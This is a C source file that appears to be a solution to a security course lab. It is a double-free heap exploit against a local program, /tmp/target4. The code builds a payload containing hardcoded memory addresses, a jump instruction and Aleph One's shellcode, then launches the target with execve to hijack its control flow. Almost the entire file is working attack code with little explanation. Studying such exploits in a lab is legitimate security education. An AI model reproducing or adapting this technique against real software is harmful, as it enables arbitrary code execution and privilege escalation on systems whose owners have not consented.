#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define EGG_SIZE 1024

/* 
 * Main idea of exploit:
 *     This double free exploit. 
 */

int main(void)
{
  char *args[3];
  char *env[1];
  long shellcodeAddr, *addrPtr, fpAddr, dummyVal, jumpInstr;
  char egg[EGG_SIZE]; /* string containing exploit code */
  int i;

  shellcodeAddr = 0x08049C68; // address of buff
  dummyVal = 0xffffffff;
  jumpInstr = 0xffff06eb; // jump instr
  fpAddr = 0xbffffa3c; // addr of eip for foo

  addrPtr = (long *) egg; 
  for (i = 0; i < EGG_SIZE; i += 4)
    *(addrPtr++) = 0xffffffff;

  memcpy(&egg[504], &shellcodeAddr, 4);
  memcpy(&egg[508], &fpAddr, 4);
  memcpy(&egg[3], &dummyVal, 4);
  memcpy(egg, &jumpInstr, 2);


  /* Then fill the first bytes of the exploit string with
     Aleph One's shellcode */
  memcpy (egg + 8, shellcode, strlen (shellcode));

  egg[EGG_SIZE - 1] = 0; /* null terminate exploit string for safety */
  
  args[0] = TARGET; args[1] = egg; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
